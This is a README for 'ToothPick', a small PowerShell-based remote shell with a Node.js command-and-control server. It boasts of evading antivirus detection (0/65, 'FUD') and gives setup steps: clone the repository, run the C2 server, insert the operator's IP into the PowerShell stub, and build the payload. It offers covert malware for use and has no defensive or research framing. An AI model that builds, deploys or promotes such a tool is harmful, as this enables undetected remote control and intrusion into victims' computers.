# ToothPick

## Table of Contents

- [About](#about)
- [Getting Started](#getting_started)
- [Usage](#usage)
- [Contributing](../CONTRIBUTING.md)

## About <a name = "about"></a>

Toothpick is a remote shell, with detection 0/65 as of 15/08/2024. It is minimalistic, to keep the size very small (<5kb) and maintain FUD.

## Getting Started <a name = "getting_started"></a>

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

```
Node.js - Tested on 20.X
```

### Installing

First clone the project and open CC folder.

```
git clone https://github.com/syrex1013/ThreatShell.git
cd CC
```

Install required node libs.

```
npm install
```

Run CC server.

```
node cc.mjs
```

You will be greeted by minimalistic shell. Write help to see available commands.

## Usage <a name = "usage"></a>

First, modify toothpick_stub.ps1 to include your IP.

After that you can run builder.js like this:
(You need to specify -b or -c parameter)

```
node builder.js -b
```
